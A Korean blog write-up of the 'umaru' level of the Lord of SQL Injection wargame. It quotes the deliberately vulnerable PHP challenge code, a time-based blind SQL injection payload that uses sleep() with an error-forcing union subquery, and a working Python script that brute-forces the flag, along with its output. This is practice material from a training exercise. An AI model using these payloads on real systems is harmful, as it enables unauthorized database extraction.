---
title: "[Lord of SQL Injection : eagle-jump] LoS - umaru 문제풀이"
date: 2018-08-24
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

내가 지금 문제를 풀고 있는 서버는 `los.rubiya.kr`인데, `los.eagle-jump.org`에도 같은 문제가 있다.
그런데 `eagle-jump` 서버의 마지막 문제는 `rubiya`의 서버에 없는 것 같아 따로 풀어보게 되었다.  

<!--more-->

코드는 다음과 같다.  

```php
<?php
  include "./config.php";
  login_chk();
  dbconnect();

  function reset_flag(){
    $new_flag = substr(md5(rand(10000000,99999999)."qwer".rand(10000000,99999999)."asdf".rand(10000000,99999999)),8,16);
    $chk = @mysql_fetch_array(mysql_query("select id from prob_umaru where id='{$_SESSION[los_id]}'"));
    if(!$chk[id]) mysql_query("insert into prob_umaru values('{$_SESSION[los_id]}','{$new_flag}')");
    else mysql_query("update prob_umaru set flag='{$new_flag}' where id='{$_SESSION[los_id]}'");
    echo "reset ok";
    highlight_file(__FILE__);
    exit();
  }

  if(!$_GET[flag]){ highlight_file(__FILE__); exit; }

  if(preg_match('/prob|_|\./i', $_GET[flag])) exit("No Hack ~_~");
  if(preg_match('/id|where|order|limit|,/i', $_GET[flag])) exit("HeHe");
  if(strlen($_GET[flag])>100) exit("HeHe");

  $realflag = @mysql_fetch_array(mysql_query("select flag from prob_umaru where id='{$_SESSION[los_id]}'"));

  @mysql_query("create temporary table prob_umaru_temp as select * from prob_umaru where id='{$_SESSION[los_id]}'");
  @mysql_query("update prob_umaru_temp set flag={$_GET[flag]}");

  $tempflag = @mysql_fetch_array(mysql_query("select flag from prob_umaru_temp"));
  if((!$realflag[flag]) || ($realflag[flag] != $tempflag[flag])) reset_flag();

  if($realflag[flag] === $_GET[flag]) solve("umaru");
?>
```

뭔가 엄청 복잡 해 보인다.
자세히 살펴보면, `reset_flag()` 라는 함수에서 `$new_flag`라는 변수를 생성한다.
이 변수는 `랜덤숫자+qwer+랜덤숫자+asdf`를 `md5`로 해싱한 후 16글자만을 자른 값이다.
그 후, 나의 `los_id`와 함께 테이블에 값을 저장한다.
내가 넘길 수 있는 쿼리스트링은 `flag` 뿐이다.

그런데 `$_GET['flag']`가 여러 곳에서 사용되는데, 내가 `flag`의 값을 넘겨주면, 몇 가지 필터링을 검사한 후 데이터베이스에 저장 된 나의 `flag`를 찾아 `prob_umaru_temp` 테이블에 저장한다.
이 후, 이 테이블에 내가 입력 한 `flag`의 값을 임시로 새로 생성 한 테이블에 저장한다.
그리고 원래 테이블에 저장되어 있던 `flag`의 값과, 임시 테이블에 저장되어 있는 `flag`의 값을 비교하는데, 만약 값이 다르거나 원래 테이블에 `flag`가 없다면 `reset_flag()` 함수를 실행시킨다.
즉, `flag`를 맞추지 못하면 계속 랜덤 값으로 `flag`가 바뀐다. ㅠㅠ
따라서 문제를 풀기 위해서는 다음과 같은 조건이 필요하다.  

> 1. flag의 값은 100글자를 넘기지 말 것  
> 2. flag가 갱신되지 않도록 update 쿼리문에서 에러를 발생시킬 것  
> 3. ,를 사용할 수 없기 때문에 sleep 함수를 사용해 값을 찾을 것  

일단 문제에서 해쉬값 중 16글자를 잘라 테이블에 저장하므로, `flag`의 길이는 16글자임을 알 수 있다.
때문에 값만 찾아내면 된다.
일단 위의 조건을 만족하는 쿼리를 찾기 위해 서버에서 이것저것 테스트 해 보았다.
제일 먼저 찾은 쿼리는 다음과 같다.  

```mysql
update prob_umaru_temp set flag=sleep(3 * (flag like 'a%')) + (select 1 union select 2)
```

이러면 먼저 `sleep()` 함수 내에서 `flag`의 값이 `a%`와 같은지를 비교하고, 같다면 `1`이 되기 때문에 `sleep(3*1)`이 만들어 진다.
즉, 3초 동안 `sleep()` 함수를 실행하게 된다.
반면 다를 경우에는 `flag like 'a%'`가 0이 되어 `sleep(3*0)`이 만들어 지기 때문에 `sleep()` 함수를 실행하지 않는다.
`sleep()` 함수를 실행한 후에는 `+`연산으로 연결 된 `select 1 union select 2`를 실행하는데, 이 전 문제들에서도 사용했다시피 해당 쿼리는 에러를 유발한다.

때문에 결과적으로 완성되는 쿼리는 에러가 발생하기 때문에 `update` 문을 실행하지 않게 되고, `prob_umaru_temp` 테이블과 `prob_umaru` 테이블에 저장된 `flag`의 값은 일치하기 때문에 `reset_flag()` 함수를 실행하지 않는다.
그래서 이를 바탕으로 코드를 구현해서 테스트 해 보았는데, 아무리 해도 결과가 나오지 않았다.
내 서버에서는 잘 되는데, 문제 서버에서는 안되길래 뭔가 설정이 다르게 되어있나 싶어서 연산자를 이것저것으로 바꿔 보았다.
그 결과 `|`를 쓰니 값을 추출할 수 있었다.
구현한 코드는 아래와 같다.  

```python
import requests
import time

flag = ""
length = 16

url = "https://los.eagle-jump.org/umaru_6f977f0504e56eeb72967f35eadbfdf5.php?flag="
session = dict(PHPSESSID = "YOUR SESSION ID")

print "[+] Start"

print "[+] Find password"

for j in range(1, length + 1):
	for i in range(48, 123):
		try:
			start = time.time()
			query = url + "sleep(3 * (flag like '" + str(flag) + str(chr(i)) +"%')) | (select 1 union select 2)"
			r = requests.post(query, cookies=session)
		except:
			print "[-] Error occur"
			continue

		if (time.time() - start) > 3:
			flag += chr(i)
			print "[+] Found " + str(j), ":", flag
			break

print "[+] Found password : ", flag
print "[+] End"
```

이 코드를 돌리면 아래와 같은 결과를 얻을 수 있다.  

```bash
$ python ex.py 
[+] Start
[+] Find password
[+] Found 1 : 8
[+] Found 2 : 89
[+] Found 3 : 892
[+] Found 4 : 8925
[+] Found 5 : 89253
[+] Found 6 : 892531
[+] Found 7 : 8925316
[+] Found 8 : 89253169
[+] Found 9 : 89253169C
[+] Found 10 : 89253169CE
[+] Found 11 : 89253169CE9
[+] Found 12 : 89253169CE98
[+] Found 13 : 89253169CE987
[+] Found 14 : 89253169CE987D
[+] Found 15 : 89253169CE987D1
[+] Found 16 : 89253169CE987D15
[+] Found password :  89253169CE987D15
[+] End
```

`php`에서 `md5` 함수를 사용하면 알파벳 소문자로 값이 출력되므로, 데이터베이스에 저장된 값도 소문자로 이루어져 있을 것이다.
따라서 알파벳 대문자를 소문자로 바꾸어 아래와 같이 입력했다.  

```plain
?flag=89253169ce987d15
```

`eagle-jump` 서버를 `All Clear` 했다!!!
이제 `rubiya` 서버에도 몇 문제 안남았으니 빨리 다 풀어야지 ㅎㅎㅎ

```plain
UMARU Clear!
```

![](/images/los/umaru/umaru_01.png)
